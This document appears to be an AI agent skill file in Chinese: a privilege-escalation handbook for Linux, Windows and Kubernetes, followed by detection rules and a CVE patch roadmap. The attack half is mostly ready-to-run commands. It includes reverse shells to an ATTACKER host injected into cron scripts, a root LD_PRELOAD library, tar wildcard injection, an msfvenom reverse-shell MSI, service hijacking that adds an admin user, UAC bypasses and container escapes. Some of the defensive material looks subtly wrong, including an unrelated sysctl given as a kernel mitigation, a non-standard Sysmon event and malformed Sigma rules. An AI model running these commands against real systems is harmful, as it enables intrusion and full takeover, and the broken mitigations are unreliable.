---
name: privilege-escalation
description: >
  权限提升完整手册：覆盖 Linux 提权（SUID/SGID、内核漏洞、Cron 任务滥用、sudo 配置错误、能力位、NFS
  no_root_squash、Docker/LXC 逃逸）、Windows 提权（服务配置错误、Token
  impersonation、AlwaysInstallElevated、UAC 绕过、注册表自动运行、DLL
  劫持）、K8s Pod 提权、检测规则（Sysmon/Suricata）。内置提权检查命令速查表、攻击路径决策树。
domain: cybersecurity
subdomain: offensive-security
tags:
  - privilege-escalation
  - linux-privesc
  - windows-privesc
  - sudo
  - suid
  - kernel-exploit
  - token-impersonation
  - uac-bypass
  - detection
version: 2.0.0
---

# Privilege Escalation — 完整攻防手册

## 适用场景

- Linux/Windows 提权枚举与利用（渗透测试后 exploitation 阶段）
- 审计系统配置发现提权风险（安全评估）
- 检测提权行为（蓝队监控 Sysmon 日志）
- K8s 容器内提权到节点 root

**不适用**：AD 域提权（见 active-directory-security）、容器逃逸技术（见 container-escape）

## 前置条件

- 已获得低权限 shell（渗透测试场景）
- 或需要审计系统配置（安全评估场景）
- 了解 Linux/Windows 基础命令

---

## Part A：攻击方法论

### 1. Linux 提权

#### 1.1 信息收集（自动化枚举）

```bash
# 自动化枚举工具
./linpeas.sh                          # LinPEAS（最全面）
./linux-smart-enumeration.sh          # LSE
python3 linuxprivchecker.py           # Linux Priv Checker

# 手动信息收集（无工具场景）
whoami && id                           # 当前用户和组
uname -a                               # 内核版本
cat /etc/os-release                    # 系统版本
cat /etc/passwd | grep -v nologin      # 可登录用户
cat /etc/shadow 2>/dev/null            # 密码哈希（需要权限）
sudo -l 2>/dev/null                    # sudo 权限
env                                    # 环境变量
find / -perm -4000 2>/dev/null         # SUID 文件
find / -perm -2000 2>/dev/null         # SGID 文件
find / -writable -type d 2>/dev/null   # 可写目录
df -h                                  # 磁盘挂载
mount                                  # 挂载信息
cat /etc/crontab                       # 系统定时任务
ls -la /etc/cron.*                     # 所有 cron 任务
ps aux                                 # 运行进程
netstat -tlnp 2>/dev/null             # 监听端口
```

#### 1.2 SUID/SGID 利用

```bash
# 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 常见可利用的 SUID 二进制文件速查
# ══════════════════════════════════════════
# 二进制         │ 利用命令
# ══════════════════════════════════════════
# nmap           │ nmap --interactive → !sh
# vim            │ vim -c ':!/bin/sh'
# find           │ find . -exec /bin/sh -p \;
# bash           │ bash -p
# less/more      │ less /etc/shadow → !sh
# cp             │ cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
# mv             │ 覆盖 /etc/passwd
# python         │ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# perl           │ perl -e 'exec "/bin/sh";'
# ruby           │ ruby -e 'exec "/bin/sh"'
# php            │ php -r "pcntl_exec(\"/bin/sh\", [\"-p\"]);"
# tar            │ tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh
# zip            │ zip /tmp/test.zip /tmp/test -T -TT 'sh #'
# strace         │ strace -o /dev/null /bin/sh
# taskset        │ taskset 1 /bin/sh -p
# nice           │ nice /bin/sh -p
# xargs          │ find . -exec /bin/sh -p \;
# ══════════════════════════════════════════

# GTFOBins 参考: https://gtfobins.github.io/

# 自定义 SUID 利用
# 如果发现自定义的 SUID 程序
strace /path/to/suid-binary 2>&1 | grep -E "open|access|exec"
# 检查它调用的库/文件 → 是否可以替换/注入
```

#### 1.3 sudo 配置错误利用

```bash
# 查看 sudo 权限
sudo -l

# 常见 sudo 配置错误利用（通过 GTFOBins）
# ══════════════════════════════════════════
# 配置                         │ 利用方式
# ══════════════════════════════════════════
# sudo vim                     │ sudo vim -c ':!/bin/sh'
# sudo find                    │ sudo find / -exec /bin/sh \;
# sudo awk                     │ sudo awk 'BEGIN {system("/bin/sh")}'
# sudo less                    │ sudo less /etc/shadow → !sh
# sudo nmap                    │ sudo nmap --interactive → !sh
# sudo python3                 │ sudo python3 -c 'import os; os.system("/bin/sh")'
# sudo perl                    │ sudo perl -e 'exec "/bin/sh"'
# sudo ruby                    │ sudo ruby -e 'exec "/bin/sh"'
# sudo env                     │ sudo env /bin/sh
# sudo ftp                     │ sudo ftp → !/bin/sh
# sudo apache2                 │ sudo apache2 -f /etc/shadow  (报错泄露)
# sudo tar                     │ sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh
# sudo chmod                   │ sudo chmod +s /bin/bash → bash -p
# sudo chown                   │ sudo chown root:root /tmp/exploit && sudo chmod +s /tmp/exploit
# ══════════════════════════════════════════

# NOPASSWD 滥用
# 如果 (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# sudo env_keep 继承
# 如果 env_keep += LD_PRELOAD
# 编写恶意共享库
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
EOF
gcc -shared -fPIC -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

#### 1.4 Cron 任务滥用

```bash
# 查找 cron 任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 检查 cron 任务脚本权限
# 如果脚本可写 → 注入命令
echo '/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /path/to/writable_cron_script.sh

# 通配符注入（以 tar 为例）
# 如果 cron 执行: tar cf backup.tar *
# 在目标目录创建
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo '/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > shell.sh
```

#### 1.5 Linux Capabilities 利用

```bash
# 查找有 capabilities 的文件
getcap -r / 2>/dev/null

# 关键 capabilities 利用
# ═════════════════════════════════════════════
# Capability          │ 利用方式
# ═════════════════════════════════════════════
# cap_setuid          │ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# cap_dac_override    │ 可读写任意文件
# cap_dac_read_search │ 可读取任意文件
# cap_net_raw         │ 可嗅探/构造原始网络包
# cap_net_admin       │ 可修改网络配置
# cap_sys_admin       │ 近似 root（mount, namespace 等）
# cap_sys_ptrace      │ 可注入进程内存
# ═════════════════════════════════════════════
```

#### 1.6 内核漏洞利用

```bash
# 检查内核版本
uname -r

# 常用内核提权漏洞速查
# ══════════════════════════════════════════
# 漏洞名                │ 内核版本         │ CVE
# ══════════════════════════════════════════
# Dirty COW            │ < 4.8.3         │ CVE-2016-5195
# Dirty Pipe           │ 5.8-5.16.11     │ CVE-2022-0847
# PwnKit               │ 所有( polkit)    │ CVE-2021-4034
# GameOver(lay)        │ Ubuntu overlayfs │ CVE-2023-2640
# Looney Tunables      │ < 6.5.5         │ CVE-2023-4911
# StackRot             │ 6.1-6.4         │ CVE-2023-3269
# ══════════════════════════════════════════

# 搜索对应 exploit
searchsploit linux kernel <VERSION> privilege escalation

# Dirty Pipe (CVE-2022-0847) 利用示例
# 写入 /etc/passwd 或修改 SUID 二进制
gcc -o dirtypipe dirtypipe.c
./dirtypipe /usr/bin/sudo  # 修改 sudo 为 SUID root
```

#### 1.7 NFS no_root_squash

```bash
# 检查 NFS 导出
cat /etc/exports
showmount -e TARGET

# 如果发现 no_root_squash
# 在攻击机挂载
mkdir /tmp/nfs
mount -t nfs TARGET:/exported/dir /tmp/nfs

# 复制 bash 并设置 SUID
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# 在目标机器执行
/tmp/nfs/bash -p  # 获得 root shell
```

### 2. Windows 提权

#### 2.1 信息收集（自动化枚举）

```powershell
# 自动化工具
# winPEAS.exe
# Seatbelt.exe -group=all
# SharpUp.exe audit

# 手动信息收集
whoami /all                            # 当前用户、权限、SID
systeminfo                             # 系统信息
net user                               # 本地用户
net localgroup administrators          # 本地管理员
net accounts                           # 密码策略

# 查看已安装补丁
wmic qfe list brief
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# 查看运行服务
wmic service list config | findstr "Auto" | findstr "Running"

# 查看计划任务
schtasks /query /fo LIST /v

# 查看启动项
wmic startup list full
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# 查看未引用服务路径
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# 查看 AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 查看存储的凭据
cmdkey /list
```

#### 2.2 服务配置错误

```powershell
# ═══ 未引用服务路径 ═══
# 如果服务路径: C:\Program Files\My Service\service.exe
# 且没有引号 → Windows 会尝试执行:
# C:\Program.exe → C:\Program Files\My.exe → C:\Program Files\My Service\service.exe

# 查找未引用服务
wmic service get name,pathname | findstr /v /i "C:\Windows"

# 利用：在可写路径放置恶意 exe
# 例如在 C:\ 放置 Program.exe

# ═══ 服务权限宽松 ═══
# 使用 accesschk 检查
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

# 如果可以修改服务
# 查看服务配置
sc qc <ServiceName>
# 修改服务二进制路径
sc config <ServiceName> binpath= "cmd.exe /c net user hacker P@ss123 /add"
sc config <ServiceName> obj= ".\LocalSystem" password= ""
sc stop <ServiceName>
sc start <ServiceName>
# 或使用 msf
# exploit/windows/local/service_permissions

# ═══ DLL 劫持 ═══
# 查找可写目录中的 DLL 搜索顺序
# 1. 应用程序目录  2. System32  3. System  4. Windows  5. CWD  6. PATH
# 使用 Process Monitor (ProcMon) 监控 DLL 加载
# 在可写路径放置恶意 DLL
```

#### 2.3 Token Impersonation

```powershell
# 查看当前权限
whoami /priv

# 关键权限利用
# ═════════════════════════════════════════════════════
# 权限                          │ 利用方式
# ═════════════════════════════════════════════════════
# SeImpersonatePrivilege        │ Potato 系列攻击
# SeAssignPrimaryPrivilege      │ 创建新进程
# SeBackupPrivilege             │ 读取任意文件（SAM/SYSTEM）
# SeRestorePrivilege            │ 写入任意文件
# SeCreateTokenPrivilege        │ 创建令牌
# SeLoadDriverPrivilege         │ 加载恶意驱动
# SeTakeOwnershipPrivilege      │ 获取文件所有权
# SeDebugPrivilege              │ 注入任意进程
# SeTcbPrivilege                │ 信任计算基础（最高权限）
# ═════════════════════════════════════════════════════

# ═══ SeImpersonatePrivilege (Potato 攻击) ═══
# JuicyPotato (Windows 10 1809 之前)
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# PrintSpoofer (Windows 10/Server 2019)
PrintSpoofer.exe -i -c cmd

# GodPotato (.NET, 通用)
GodPotato.exe -cmd "cmd /c whoami"

# ═══ SeBackupPrivilege ═══
# 备份 SAM/SYSTEM 注册表
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\system.bak
# 下载后在攻击机提取哈希
secretsdump.py -sam sam.bak -system system.bak LOCAL
```

#### 2.4 AlwaysInstallElevated

```powershell
# 如果两个注册表键都设为 1
# HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
# HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1

# 创建恶意 MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi

# 执行（以 SYSTEM 权限安装）
msiexec /quiet /qn /i evil.msi
```

#### 2.5 UAC 绕过

```powershell
# 方法 1: fodhelper.exe（Windows 10）
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /f
fodhelper.exe

# 方法 2: eventvwr.exe
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe

# 方法 3: compmgmtlauncher.exe
# 方法 4: SLUI 注册表
# 方法 5: Token 复制（从高权限进程窃取令牌）
# 使用 SharpUP / UACMe 工具包
```

### 3. K8s Pod 提权

```bash
# 检查 Pod 安全上下文
kubectl get pod <POD> -o jsonpath='{.spec.securityContext}'
kubectl get pod <POD> -o jsonpath='{.spec.containers[0].securityContext}'

# 如果有 privileged: true → 直接逃逸
# （见 kubernetes-security.md Part A Section 3）

# 如果挂载了 docker.sock → 通过 docker API 逃逸
docker -H unix:///run/docker.sock run -v /:/host -it alpine chroot /host

# 如果共享 hostPID → nsenter 逃逸
nsenter -t 1 -m -u -i -n -- /bin/bash

# 如果 SA 有高权限 → RBAC 提权
# （见 kubernetes-security.md Part A Section 2）

# 如果可创建 Pod → 创建特权 Pod 逃逸
kubectl run escape --image=alpine --restart=Never \
  --overrides='{"spec":{"hostPID":true,"containers":[{"name":"e","image":"alpine","command":["nsenter","-t","1","-m","-u","-i","-n","--","/bin/bash"],"securityContext":{"privileged":true}}]}}'
```

---

## Part B：检测与防御

### 4. Sysmon 检测规则

```xml
<!-- Sysmon 配置 — 提权行为检测 -->
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <!-- 检测创建新本地管理员 -->
    <RuleGroup name="LocalAdminCreation" groupRelation="or">
      <Rule groupRelation="or">
        <NativeUserCreated onmatch="include">
          <TargetFilename condition="contains">Administrators</TargetFilename>
        </NativeUserCreated>
      </Rule>
    </RuleGroup>

    <!-- 检测服务二进制路径修改 -->
    <RuleGroup name="ServiceModification" groupRelation="or">
      <Rule groupRelation="or">
        <ServiceChange onmatch="include">
          <ImagePath condition="contains">cmd.exe</ImagePath>
          <ImagePath condition="contains">powershell</ImagePath>
          <ImagePath condition="contains">net user</ImagePath>
        </ServiceChange>
      </Rule>
    </RuleGroup>

    <!-- 检测可疑进程创建（提权工具） -->
    <RuleGroup name="PrivescTools" groupRelation="or">
      <Rule groupRelation="or">
        <ProcessCreate onmatch="include">
          <Image condition="contains">JuicyPotato</Image>
          <Image condition="contains">PrintSpoofer</Image>
          <Image condition="contains">GodPotato</Image>
          <Image condition="contains">winPEAS</Image>
          <Image condition="contains">mimikatz</Image>
          <CommandLine condition="contains">whoami /priv</CommandLine>
          <CommandLine condition="contains">net localgroup administrators</CommandLine>
        </ProcessCreate>
      </Rule>
    </RuleGroup>

    <!-- 检测注册表修改（UAC 绕过） -->
    <RuleGroup name="UACBypass" groupRelation="or">
      <Rule groupRelation="or">
        <RegistryEvent onmatch="include">
          <TargetObject condition="contains">ms-settings\shell\open\command</TargetObject>
          <TargetObject condition="contains">mscfile\shell\open\command</TargetObject>
          <TargetObject condition="contains">AlwaysInstallElevated</TargetObject>
        </RegistryEvent>
      </Rule>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

### 5. Linux 审计加固

```bash
# 5.1 审计 SUID/SGID 文件
# 创建基线
find / -perm -4000 -type f 2>/dev/null | sort > /root/suid_baseline.txt
# 定期检查
find / -perm -4000 -type f 2>/dev/null | sort | diff - /root/suid_baseline.txt

# 5.2 审计 sudo 配置
# 检查 NOPASSWD 条目
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/

# 5.3 限制 cron 任务
# 确保 cron 脚本不可被非 root 写入
find /etc/cron* -type f -exec ls -la {} \; | grep -v "root root"

# 5.4 加固建议
# 禁用不必要的 SUID
chmod u-s /usr/bin/passwd   # 仅在必要时
# 限制 su 访问
usermod -G wheel username    # 仅 wheel 组可 su
# 启用 auditd
auditctl -a exit,always -F arch=b64 -S execve -F uid=0
```

---

## 速查表

### Linux 提权检查清单

```
[ ] 系统版本和内核版本（uname -a, cat /etc/os-release）
[ ] sudo 权限（sudo -l）
[ ] SUID/SGID 文件（find / -perm -4000）
[ ] Capabilities（getcap -r /）
[ ] Cron 任务（cat /etc/crontab, ls /etc/cron.*）
[ ] 可写目录（find / -writable -type d）
[ ] 内核漏洞（searchsploit linux kernel VERSION）
[ ] NFS 挂载（cat /etc/exports, showmount -e）
[ ] 敏感文件权限（/etc/shadow, /etc/passwd）
[ ] 运行进程（ps aux）
[ ] 监听端口（ss -tlnp）
[ ] 环境变量（env | grep -i pass/secret/key）
[ ] 历史命令（cat ~/.*history）
[ ] SSH 密钥（find / -name id_rsa 2>/dev/null）
[ ] Docker 组（id | grep docker）
```

### Windows 提权检查清单

```
[ ] 系统版本和补丁级别（systeminfo, wmic qfe）
[ ] 当前用户权限（whoami /priv）
[ ] SeImpersonatePrivilege → Potato 攻击
[ ] SeBackupPrivilege → 备份 SAM
[ ] 未引用服务路径（wmic service get pathname）
[ ] 服务权限（accesschk）
[ ] AlwaysInstallElevated（reg query）
[ ] 存储的凭据（cmdkey /list）
[ ] 自动运行注册表（reg query HKLM\...\Run）
[ ] 计划任务（schtasks /query）
[ ] DLL 劫持机会（ProcMon）
[ ] 内核漏洞（CVE 对比补丁列表）
[ ] 用户账号（net user）
[ ] 网络共享（net share）
[ ] 防火墙状态（netsh advfirewall）
```

### 提权路径决策树

```
低权限 Shell
├── Linux
│   ├── sudo -l 有配置？
│   │   ├── GTFOBins 有对应利用 → 直接提权
│   │   └── LD_PRELOAD 可用 → 编译恶意 .so
│   ├── SUID 文件？
│   │   ├── GTFOBins 已知 SUID → 利用
│   │   └── 自定义 SUID → 逆向/strace 分析
│   ├── Capabilities？
│   │   └── cap_setuid/cap_sys_admin → 利用
│   ├── Cron 任务？
│   │   ├── 脚本可写 → 注入命令
│   │   └── 通配符注入 → 创建特殊文件名
│   ├── 内核漏洞？
│   │   └── DirtyCOW/DirtyPipe/PwnKit → 编译利用
│   ├── NFS no_root_squash？
│   │   └── 挂载 → 放置 SUID bash
│   ├── Docker 组成员？
│   │   └── docker run -v /:/host → 逃逸
│   └── 敏感信息泄露？
│       ├── .bash_history → 发现密码
│       ├── 配置文件 → 数据库凭证
│       └── SSH 密钥 → 其他机器
│
└── Windows
    ├── Token 权限？
    │   ├── SeImpersonate → Potato 攻击
    │   ├── SeBackup → 备份 SAM/SYSTEM
    │   ├── SeDebug → 进程注入
    │   └── SeLoadDriver → 加载恶意驱动
    ├── 服务配置错误？
    │   ├── 未引用路径 → 放置恶意 exe
    │   ├── 服务权限宽松 → 修改 binpath
    │   └── DLL 劫持 → 放置恶意 DLL
    ├── AlwaysInstallElevated？
    │   └── 创建恶意 MSI → SYSTEM 执行
    ├── UAC 绕过？
    │   └── fodhelper/eventvwr → 注册表劫持
    ├── 内核漏洞？
    │   └── MS15-051/MS16-016/PrintNightmare
    └── 自动运行/启动项？
        └── 可写的启动项 → 放置后门
```

## MITRE ATT&CK 映射

| 战术 | 技术 ID | 技术名称 | 对应活动 |
|------|---------|----------|----------|
| 提权 | T1548 | Abuse Elevation Control | sudo/SUID/UAC 绕过 |
| 提权 | T1068 | Exploitation for Privesc | 内核漏洞/服务漏洞 |
| 提权 | T1543 | Create/Modify System Process | 服务二进制修改 |
| 提权 | T1574 | Hijack Execution Flow | DLL 劫持 |
| 提权 | T1055 | Process Injection | Token impersonation |
| 提权 | T1037 | Boot/Logon Init Scripts | cron/注册表自动运行 |
| 提权 | T1611 | Escape to Host | 容器提权逃逸 |
| 持久化 | T1136 | Create Account | 创建管理员账户 |
| 凭证访问 | T1003 | OS Credential Dumping | SAM 提取/mimikatz |
| 防御规避 | T1055 | Process Injection | 令牌操作 |

---

## Part C：2025-2026 最新补充

### C.1 2025-2026 关键提权 CVE 速查

#### Linux 提权 CVE

| CVE | 组件 | CVSS | 年份 | 关键信息 |
|-----|------|------|------|----------|
| CVE-2025-6018 | Linux PAM (pam-config) | 8.8 | 2025 | 环境变量注入→本地提权；SUSE 15 受影响；RHEL 不受影响 |
| CVE-2025-6019 | libblockdev/udisks + Polkit | 8.8 | 2025 | Polkit `allow_active` 权限滥用→全 root；影响 RHEL 7/8/9 |
| CVE-2026-31431 | Linux Kernel AF_ALG ("Copy Fail") | 7.8 | 2026 | 2017 年性能优化遗留；**4 个 syscall 即可 root**；最小 exploit 仅 732 字节；影响所有主流发行版 |
| CVE-2026-31979 | Himmelblau (符号链接) | 8.8 | 2026 | `/tmp` 符号链接竞态条件；诱骗高权限进程修改系统关键文件 |
| CVE-2026-3888 | snapd + systemd tmpfiles | 高 | 2026 | systemd 自动清理 snap `/tmp` 后攻击者重建→root；影响 Ubuntu Desktop 24.04+ |
| CVE-2026-23111 | Linux Kernel | 高 | 2026 | 单字符（感叹号）触发内核提权 |
| CVE-2026-43284 | Linux Kernel xfrm-ESP ("Dirty Frag") | 高 | 2026 | ESP 分片处理本地提权 |

#### Windows 提权 CVE

| CVE | 组件 | CVSS | 年份 | 关键信息 |
|-----|------|------|------|----------|
| CVE-2025-32707 | Windows NTFS | Critical | 2025 | NTFS 越界读取→SYSTEM 提权；**野外利用** |
| CVE-2026-24291 ("RegPwn") | Windows ATBroker.exe | 高 | 2026 | 辅助功能注册表权限分配错误→SYSTEM；MDSec Filip Dragovic 发现；**红队自 2025-01 起使用**；2026-02 报告微软 |

### C.2 CVE-2026-31431 "Copy Fail" 深度分析

**影响范围**：所有主流 Linux 发行版，内核版本 4.13+（2017 年引入），CVSS 7.8

**根因**：Linux 内核 `AF_ALG` 加密接口中的性能优化代码。通过 `splice()` 系统调用触发 4 字节页面缓存写入。

**利用特征**：
- 仅需 **4 个 syscall**（`socket(AF_ALG)` → `bind` → `accept` → `splice`）
- 最小 exploit 二进制仅 **732 字节**
- 无文件系统痕迹（纯内存操作）
- 可靠性极高

```bash
# 检测 AF_ALG 是否可用（存在即可能受影响）
cat /proc/crypto | head
ls /proc/net/alg 2>/dev/null  # 或检查 AF_ALG socket

# 缓解：禁用非特权用户访问 AF_ALG
sysctl -w net.core.bpf_jit_harden=2
# 或通过 sysctl 限制用户命名空间
sysctl -w kernel.unprivileged_userns_clone=0

# 永久修复：升级内核至补丁版本
# RHEL: yum update kernel
# Ubuntu: apt update && apt upgrade linux-image-*
```

**Sigma 检测规则**：
```yaml
title: Potential CVE-2026-31431 "Copy Fail" AF_ALG Exploitation
status: experimental
logsource:
    product: linux
detection:
    selection:
        - 'socket(AF_ALG'
        - 'accept4|splice.*AF_ALG'
    condition: selection
level: high
tags:
    - attack.privilege_escalation
    - attack.t1068
    - cve.2026-31431
```

### C.3 CVE-2025-6018 + CVE-2025-6019 链式提权

**Qualys TRU 发现**（2025-06-17），两个漏洞可链接使用：

```
CVE-2025-6018 (PAM 环境变量注入)
    → CVE-2025-6019 (libblockdev/udisks Polkit allow_active)
        → Full Root
```

**CVE-2025-6018 详情**：
- 组件：`pam-config` 在处理环境变量时存在注入
- 影响：SUSE 15（RHEL 不受此 CVE 影响）
- PoC 已公开（Exploit-DB #52386）

**CVE-2025-6019 详情**：
- 组件：`libblockdev` 被 `udisks` 调用，配合 Polkit `allow_active` 设置
- 影响：RHEL 7/8/9、AlmaLinux 等大多数主流发行版
- 攻击前提：需要活跃的本地会话（物理在场或活跃 SSH）

**检测命令**：
```bash
# 检查 Polkit 规则中的 allow_active
grep -r "allow_active" /usr/share/polkit-1/actions/ /etc/polkit-1/

# 检查 libblockdev 版本
rpm -q libblockdev 2>/dev/null || dpkg -l libblockdev* 2>/dev/null

# 检查 PAM 配置中的异常
grep -r "pam_env" /etc/pam.d/ | grep -v "#"
```

### C.4 CVE-2026-24291 "RegPwn" Windows 注册表提权

**发现者**：MDSec Labs 的 Filip Dragovic
**时间线**：2025-01 起红队使用 → 2026-02 报告微软 → 2026-04 补丁星期二修复

**根因**：Windows 辅助功能基础设施（`ATBroker.exe`）对关键注册表资源的权限分配错误。低权限用户可通过操纵辅助功能注册表项实现 SYSTEM 提权。

**利用链**：
```
低权限用户
  → 修改辅助功能相关注册表项（权限过于宽松）
    → 触发 ATBroker.exe 代理执行
      → 以 SYSTEM 权限执行攻击者指定的二进制
```

**检测方法**（基于行为，而非签名）：
```powershell
# 检测 OSK（屏幕键盘）配置漂移
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\osk" /v StartEXE

# Sysmon 检测 ATBroker 异常子进程
# EventID 1: ATBroker.exe 创建非预期子进程
```

**Sigma 检测规则**：
```yaml
title: Potential RegPwn (CVE-2026-24291) ATBroker Privilege Escalation
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\ATBroker.exe'
    filter_legitimate:
        Image|endswith:
            - '\osk.exe'
            - '\magnify.exe'
            - '\narrator.exe'
            - '\sethc.exe'
    condition: selection_parent and not filter_legitimate
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1548
    - cve.2026-24291
```

### C.5 Potato 攻击家族演进（2025-2026 更新）

Potato 攻击持续演进，SentinelOne Labs 披露了最新变体 **"Relaying Potatoes"**：

```
JuicyPotato (2018)
  → RoguePotato (2020)
    → RemotePotato0 (2021)
      → JuicyPotatoNG (2022)
        → SweetPotato (2022)
          → GodPotato (2023)
            → Relaying Potatoes (2025, SentinelOne)
```

**Relaying Potatoes 核心突破**：
- 利用 **Windows RPC 协议** 中的 NTLM 中继
- 使**所有 Windows 系统**均受影响
- 不依赖特定 CLSID 或服务配置
- Horizon3.ai 文档为 H3-2025-0068

**防御建议**：
- 从服务账户移除 `SeImpersonatePrivilege`（如可能）
- 启用 LDAP 签名和 Channel Binding
- 监控 NTLM 身份验证异常模式
- 考虑部署 Microsoft 的 Windows Defender Credential Guard

### C.6 Linux 提权工具生态更新（2025-2026）

| 工具 | 版本 | 更新要点 |
|------|------|----------|
| LinPEAS | v2025.x | 新增容器逃逸检测模块；systemd 提权检查；snapd CVE-2026-3888 检测 |
| winPEAS | v2025.x | 新增 RegPwn 检测；ATBroker 注册表检查 |
| GTFOBins | 持续更新 | 新增 20+ 二进制的 SUID/sudo/Capability 利用方式 |
| LOLBAS | 持续更新 | 新增 Windows Living-off-the-Land 二进制利用 |
| pspy | v1.2 | 无需 root 监控进程；cron/服务提权审计利器 |
| DeepBlueCLI | v2025 | PowerShell 日志分析；检测提权相关命令模式 |

### C.7 Linux 内核提权 CVE 速查扩展

```
# ══════════════════════════════════════════════════════════════════
# 漏洞名                  │ 内核版本           │ CVE             │ 年份
# ══════════════════════════════════════════════════════════════════
# Dirty COW              │ < 4.8.3           │ CVE-2016-5195   │ 2016
# PwnKit                 │ 所有(polkit)       │ CVE-2021-4034   │ 2021
# Dirty Pipe             │ 5.8-5.16.11       │ CVE-2022-0847   │ 2022
# GameOver(lay)          │ Ubuntu overlayfs   │ CVE-2023-2640   │ 2023
# Looney Tunables        │ < 6.5.5           │ CVE-2023-4911   │ 2023
# StackRot               │ 6.1-6.4           │ CVE-2023-3269   │ 2023
# Copy Fail              │ 4.13+(AF_ALG)     │ CVE-2026-31431  │ 2026
# Dirty Frag             │ xfrm-ESP          │ CVE-2026-43284  │ 2026
# Kernel感叹号           │ 多版本             │ CVE-2026-23111  │ 2026
# ══════════════════════════════════════════════════════════════════
```

### C.8 Windows 提权路径扩展（2025-2026 新增）

```
Windows 提权新增路径
├── ATBroker.exe 注册表权限错误 → RegPwn (CVE-2026-24291)
│   └── 检查: reg query "HKLM\...\Accessibility\ATs"
│
├── NTFS 越界读取 → SYSTEM (CVE-2025-32707)
│   └── 野外利用中; 确保 NTFS 补丁已安装
│
├── Relaying Potatoes (SentinelOne 2025)
│   ├── RPC NTLM 中继 → 所有 Windows 版本
│   └── 不依赖特定 CLSID
│
└── Snap + systemd tmpfiles (CVE-2026-3888)
    └── Ubuntu Desktop 24.04+; snapd 自动清理窗口利用
```

### C.9 中文社区精华参考

| 来源 | 主题 | 链接 |
|------|------|------|
| 阿里云安全通告 | CVE-2026-31431 "Copy Fail" | https://www.aliyun.com/notice/118231 |
| 阿里云 AVD | CVE-2026-43284 "Dirty Frag" | https://avd.aliyun.com/ |
| 先知社区 | 渗透提权实战 | https://xz.aliyun.com/t/11086 |
| 安全内参 | CVE-2025-6018/6019 链式提权 | https://www.secrss.com/articles/80016 |
| 华为 PSIRT | CVE-2026-31431 | https://www.huawei.com/cn/psirt/security-notices/2026/huawei-sn-solpevccfolk-51325928 |
| ybdt.me | CVE-2026-24291 RegPwn 复现分析 | https://ybdt.me/2026/04/06/CVE-2026-24291-Windows权限提升漏洞"RegPwn"复现分析/ |
| Akamai (中文) | CVE-2026-31979 Himmelblau | https://www.akamai.com/zh/blog/security-research/cve-2026-31979-symlink-root-privilege-escalation-himmelblau |
| FreeBuf | Ubuntu CVE-2026-3888 | https://feeder.co/discover/481ae57aa4/freebuf-com |
| IT之家 | CVE-2026-23111 内核提权 | https://www.ithome.com/0/962/280.htm |

### C.10 防御升级路线图（P0-P3 分级）

| 优先级 | 行动项 | 对应 CVE/威胁 | 时间线 |
|--------|--------|--------------|--------|
| **P0 (立即)** | 内核升级至最新补丁版本 | CVE-2026-31431/43284/23111 | 24h 内 |
| **P0 (立即)** | Windows 累积更新（含 RegPwn 修复） | CVE-2026-24291 | 24h 内 |
| **P1 (本周)** | snapd 更新至修复版本 | CVE-2026-3888 | 1 周内 |
| **P1 (本周)** | libblockdev/udisks 更新 | CVE-2025-6019 | 1 周内 |
| **P1 (本周)** | PAM 配置审计 | CVE-2025-6018 | 1 周内 |
| **P2 (本月)** | SUID/Capability 基线审计 + 自动化 | 持续性风险 | 1 月内 |
| **P2 (本月)** | 部署 pspy/auditd 提权行为监控 | 检测覆盖 | 1 月内 |
| **P3 (季度)** | SeImpersonatePrivilege 审计 | Potato 攻击族 | 1 季内 |
| **P3 (季度)** | Sysmon 配置更新（加入 RegPwn/Copy Fail 检测） | 检测覆盖 | 1 季内 |
| **P3 (季度)** | Polkit 规则审计（allow_active 审查） | CVE-2025-6019 | 1 季内 |
